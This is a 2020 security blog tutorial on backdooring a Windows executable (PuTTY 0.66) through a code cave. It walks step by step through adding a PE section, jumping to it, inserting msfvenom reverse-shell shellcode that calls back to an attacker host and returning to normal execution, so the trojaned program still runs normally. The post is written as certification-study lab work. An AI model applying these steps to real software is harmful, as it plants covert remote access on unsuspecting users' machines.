<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Backdooring Portable Executables (PE)" /><meta name="author" content="Noah Tongate" /><meta property="og:locale" content="en_US" /><meta name="description" content="Summary" /><meta property="og:description" content="Summary" /><link rel="canonical" href="https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/" /><meta property="og:url" content="https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/" /><meta property="og:site_name" content="Ap3x Security" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-22T15:11:37-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Backdooring Portable Executables (PE)" /><meta name="google-site-verification" content="hc0WsMROlLqBrjOZFEzVWbNtkroIFS0ATmWAsvSWHP8" /> <script type="application/ld+json"> {"headline":"Backdooring Portable Executables (PE)","dateModified":"2020-05-22T15:11:37-04:00","datePublished":"2020-05-22T15:11:37-04:00","description":"Summary","url":"https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/","mainEntityOfPage":{"@type":"WebPage","@id":"https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/"},"@type":"BlogPosting","author":{"@type":"Person","name":"Noah Tongate"},"@context":"https://schema.org"}</script><title>Backdooring Portable Executables (PE) | Ap3x Security</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LSK4HZJM17"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LSK4HZJM17'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/profile/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ap3x Security</a></div><div class="site-subtitle font-italic">Security Engineer, OSCP Certified, Wannabe Hacker, and Engineering Student</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Ap3x" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['noah.tongate','gmail.com'].join('@')" aria-label="email" class="order-4" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/noahtongate" aria-label="linkedin" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Backdooring Portable Executables (PE)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Backdooring Portable Executables (PE)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, May 22, 2020, 3:11 PM -0400" > May 22, 2020 <i class="unloaded">2020-05-22T15:11:37-04:00</i> </span> by <span class="author"> Noah Tongate </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1794 words">9 min</span></div></div><div class="post-content"><h3 id="summary">Summary</h3><p>In this section of my I will be covering the topic of backdooring executables using shellcode and code caves.</p><h3 id="code-caves">Code Caves</h3><h4 id="intro">Intro</h4><p>Many people may have never heard about code caves unless you are familiar with area of Reverse Engineering. So I can help explain this terminology in laymen terms. Essentially a “code cave” is a section in the applications executable that has an allocated section for certain code to run then to return back to the area of the application where the program execution had previously left off at when it was clicked on or executed. Usually a code cave has malicious code to run a command on the victims machine or to make a connection back to the attacker.</p><h4 id="why-code-caves">Why Code Caves?</h4><p>In simple terms you can think a code cave as a function call… except for a few minor differences. So you may ask if a code cave is so similar to a function then why do we need it? I think codeproject.com answered this question very well so here is a snippet:</p><blockquote><p>The reason we need codecaves is because source code is rarely available to modify any given program. As a result, we have to physically (or virtually) modify the executable at an assembly level to make changes.</p></blockquote><p>But you may ask why would you want to modify a pre-existing application? If there is a instance when a company wants you to update an existing software, but no longer has the source code for the product then code caves may be a solution. In the image belwo we can see what a normal execution flow would look like. The program would execute the steps in order A,B, then C</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/codecave1.png" style="width: 25%" /></p><p>If we introduce a code cave as seen below the execution flow will change to the following order A, D, B, then C. If you notice in the photo the the relation to where the code cave is place in the application isn’t really explained, but will be covered later.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/codecave2.png" style="width: 25%" /></p><p>No that we are a little familiar with how code caves work theoretically we can begin to explain the more detailed aspects such as the location of the code cave. A code cave can either be placed inside the process space for the application or in a loaded DLL that is called upon in the executable. When a code cave is placed in the executable it is usually codded inline to a location that is unused by the application as seen in the image below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/codecave3.png" style="width: 25%" /></p><p>The advantages to is that its fast to implement using a disassembler to modify the executable such as OllyDbg. Using something like OllyDbg you can modify the application and save the changes and distribute the executable. Not only is it fast, but it is also easy to debug or test. Using a debugger you can set breakpoints right before and after the code cave is executed to ensure the code cave is being executed and continuing with the proper execution flow. There are some disadvantages to using a code cave within an executable is that since you have to add the code directly to the file it will thus increase the size of the file. This can throw off some AV or someone who is comparing the checksums of the file with the distributor checksum value. Also there may be a possibility that there is a limited space in the executable that can be used for the code cave. It may also be hard to find code to overwrite and if you aren’t careful this can cause the program instability. In addition in order to add the code cave to the executable we will have to code in assembly since we modifying the application directly where we don’t have access to the source code.</p><p>There is a second option and that is to implement a code cave through a DLL or library that is called upon in the application. The execution flow will change in this instance since the program execution will have to leave the program module to an external module (DLL/Library) as shown below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/codecave4.png" style="width: 25%" /></p><p>There are also advantages and disadvantages to adding a code cave in a DLL. The advantages to developing a code cave in a separate DLL is that you wont have to use lower level programming language such as assembly to implement the code cave. This allows the developer of the code cave more control over and use of more complicated logic. There are also some disadvantages to implementing a code cave in a DLL in a EXE is the amount of time it takes to implement. Another big issue is that it’s harder to debug and test since its using a DLL.</p><h3 id="code-cave-resources">Code Cave Resources</h3><ul><li>https://www.codeproject.com/Articles/20240/The-Beginners-Guide-to-Codecaves#Introduction0</ul><h3 id="backdooring-portable-executable-pe-demo">Backdooring Portable Executable (PE) Demo</h3><p>Now that we know the theory behind code caves and advantages and disadvantages we can begin to put that theory into practice and backdoor a PE. For this demo I am using a Windows 10 64 bit machine that is hosted on my Proxmox Server with the following specs below.</p><ul><li>Windows 10 64 Bit<li>8 Gb of Ram<li>4 Cores<li>50 Gb Hard Drive</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/proxmox.png" style="width: 75%" /></p><p>I have also used Remote Desktop for ease of use.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/Desktop.png" style="width: 75%" /></p><h4 id="tools">Tools</h4><p>The Tools that we will be using to backdoor the PE is listed below.</p><ul><li>Kali<ul><li>Metasploit -&gt; msfvenom</ul><li>Windows 10<ul><li><a href="http://woodmann.com/collaborative/tools/index.php/LordPE">LordPE</a><li>Vulnerable PE -&gt; <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/releases/0.66.html">PuTTY version 0.66</a><li>Immunity Debugger</ul></ul><h4 id="demo">Demo</h4><p>You can use any debugger such as OllyDbg or WinDbg, but coming from the OSCP PWK they teach you to use Immunity Debugger. First we want download the portable executable that we will adding our shellcode into. For this example I’m gonna use PuTTY 0.66</p><p>Open LordPE and click on PE editor. Once you have opened putty in the PE Editor click on “Sections” button and you should get a new window similar to below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo1.png" style="width: 75%" /></p><p>Click on one of the sections then right click then click on “add section header”. A new section should appear at the bottom of the list called “.NewSec” you want right click on that and click “edit section header”. First we want to change the name to “.cave” then we want to change the values of the Virtual Size and the Raw Size to 1000. This space will be used for our shellcode and extra instructions. Then click OK, close the PE editor, save the file, and close LordPE. Now open PuTTY in the hex editor HxD and scroll to the bottom of the file. Then click edit and insert 1000 bytes and save the file and close. This ensures that our code cave has enough space for our shellcode and any other instructions we need to add.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo2.png" style="width: 75%" /></p><p>Now open PuTTY in Immunity Debugger and copy the first few instructions and place it in a text file for later. We will use these instructions to go back to our normal execution once we have executed our shellcode. Back in Immunity Debugger you want to view the memory map and copy the address of our code cave as shown below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo3.png" style="width: 75%" /></p><p>The address is <em>00484000</em> now go back to the main thread and change the first instruction to jump to our code cave.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo4.png" style="width: 75%" /></p><p>Then highlight the changes and right click and copy to executable and save the file to a new file called “putty1.exe”.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo5.png" style="width: 75%" /></p><p>Then open that file in Immunity Debugger again and hit F7 to step into the code cave.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo6.png" style="width: 75%" /></p><p>Before we begin to add our shellcode we need to save the state of the registers using the <em>PUSHAD</em> and <em>PUSHFD</em> instructions and place them at the top of our code cave. You can find more info about these instruction here https://en.wikipedia.org/wiki/X86_instruction_listings. Now we want to generate our shellcode using the command below.</p><blockquote><p>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.7.32 LPORT=443 -f hex -o shellcode.txt</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/Shellcode.png" style="width: 75%" /></p><p>Now copy the hex and go back to Immunity Debugger and paste it below the <em>PUSHAD</em> and <em>PUSHFD</em> instructions.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo8.png" style="width: 75%" /></p><p>After a few tries of backdooring putty and getting a shell it would never jump back to its normal execution flow. Through some research I have found out that the instruction <em>DEC ESI</em> will decrement the ESI register by 1, thus resulting in the ESI being equal to 00000000. The PUSH ESI pushes it to the stack, at this point that value is FFFF FFFF or -1. Finally INC ESI brings it back to 0000 0000 again. That FFFF FFFF later gets passed to the WaitForSingleObject function. If you don’t want to push -1 to the stack then you can replace DEC ESI and PUSH ESI with NOPS.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/IDK2.png" style="width: 75%" /></p><p>Now we need to highlight our changes and save the changes to a file that will be renamed to “putty2.exe”. Then we want to open our new file in Immunity Debugger and jump back to the code cave. Then set a breakpoint on the instruction after the <em>PUSHAD</em> and <em>PUSHFD</em> instruction and copy the ESP register and paste it in the text file for now.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo9.png" style="width: 75%" /></p><p>As you can see the ESP register is <em>0019FF50</em>. Then Set a breakpoint at the end of the shellcode instructions. Next we want to open a netcat listener on our kali machine to catch the shell.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo10.png" style="width: 75%" /></p><p>Then go back to Immunity Debugger and run the program. GREAT WE HAVE A SHELL!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo11.png" style="width: 75%" /></p><p>Not so fast we still need to align the ESP register. So copy the ESP register again. In this case the ESP register is <em>0019FD4C</em>. Now we need to align the stack.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo12.png" style="width: 75%" /></p><p>Before execution of our shellcode the ESP had a value of <em>0019FF50</em> and after the execution of the shellcode it had a value of <em>0019FD4C</em> to get back to <em>0019FF50</em> we need to find the offset and add that to our ESP.</p><blockquote><p><em>0019FF50</em> - <em>0019FD4C</em> = 204</p></blockquote><p>Since we want to continue with our execution flow we need to change the last instruction to a <em>NOP</em> and restore the registers to its previous state and continue with the execution flow. Next we have to realign the ESP by adding 204 to our ESP register. Then we need to add <em>POPFD</em> and <em>POPAD</em> after our <em>ADD ESP, 204</em> instruction. Finally we will have to paste in the instructions we copied at the beginning of the portable executable to return to its normal execution flow.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo13.png" style="width: 75%" /></p><p>Then highlight the changes and save that to a new executable we will call putty3.exe. This will be our final backdoored portable executable and as you can see if we click on putty3.exe it gives us a shell and runs the program as intended. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo11.png" style="width: 75%" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-05-22-backdooring-portable-executables-(pe)/demo14.png" style="width: 75%" /></p><p>Just to note that this an old method that is now caught be antivirus to in order to get around this we will have to have Windows Defender turned off on our VM to play with our backdoored portable executable.</p><h4 id="resources">Resources</h4><ul><li>https://sector876.blogspot.com/2013/03/backdooring-pe-files-part-1.html<li>https://sector876.blogspot.com/2013/03/backdooring-pe-files-part-2.html<li>https://ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode<li>https://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/offensive-security/'>Offensive Security</a>, <a href='/categories/osce/'>OSCE</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/osce/" class="post-tag no-text-decoration" >osce</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/devlopment/" class="post-tag no-text-decoration" >devlopment</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/backdoor/" class="post-tag no-text-decoration" >backdoor</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >shellcode</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Backdooring Portable Executables (PE) - Ap3x Security&url=https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Backdooring Portable Executables (PE) - Ap3x Security&u=https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Backdooring Portable Executables (PE) - Ap3x Security&url=https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/exploit-education-protostar-stack-series/">Exploit Exercise Protostar Stack Series</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/osce/">osce</a> <a class="post-tag" href="/tags/development/">development</a> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/how-to/">how to</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/overflow/">overflow</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/proxmox/">proxmox</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/egghunter-x86_64/"><div class="card-body"> <span class="timeago small" > Jul 6, 2020 <i class="unloaded">2020-07-06T12:46:49-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>EggHunter x86_64</h3><div class="text-muted small"><p> What is an Egg Hunter? Essentially an egg hunter is used assuming that you found a overflow vulnerability with a very small space that you, the attacker controls that is less that that of a bind/r...</p></div></div></a></div><div class="card"> <a href="/posts/offensive-security-certified-expert-study-plan/"><div class="card-body"> <span class="timeago small" > May 11, 2020 <i class="unloaded">2020-05-11T12:52:52-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Offensive Security Certified Expert Study Plan</h3><div class="text-muted small"><p> While taking summer computer science and engineering classes I took part in an independent study which allows me to make my own course essentially and do research on the topics I choose. So I decid...</p></div></div></a></div><div class="card"> <a href="/posts/advance-web-attacks/"><div class="card-body"> <span class="timeago small" > May 16, 2020 <i class="unloaded">2020-05-16T16:47:17-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Advance Web Attacks</h3><div class="text-muted small"><p> Introduction This content is gathered from multiple different resources that I have added all to this post that helped me understand and learn more about exploit development. There are a lot of go...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/advance-web-attacks/" class="btn btn-outline-primary" prompt="Older"><p>Advance Web Attacks</p></a> <a href="/posts/egghunter-x86_64/" class="btn btn-outline-primary" prompt="Newer"><p>EggHunter x86_64</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Loading comments from <a href="https://disqus.com/">Disqus</a> ...</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//blog-9jgepddjsv.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Backdooring Portable Executables (PE)'; this.page.url = 'https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/'; this.page.identifier = '/posts/backdooring-portable-executables-(pe)/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/Ap3x">Noah Tongate</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 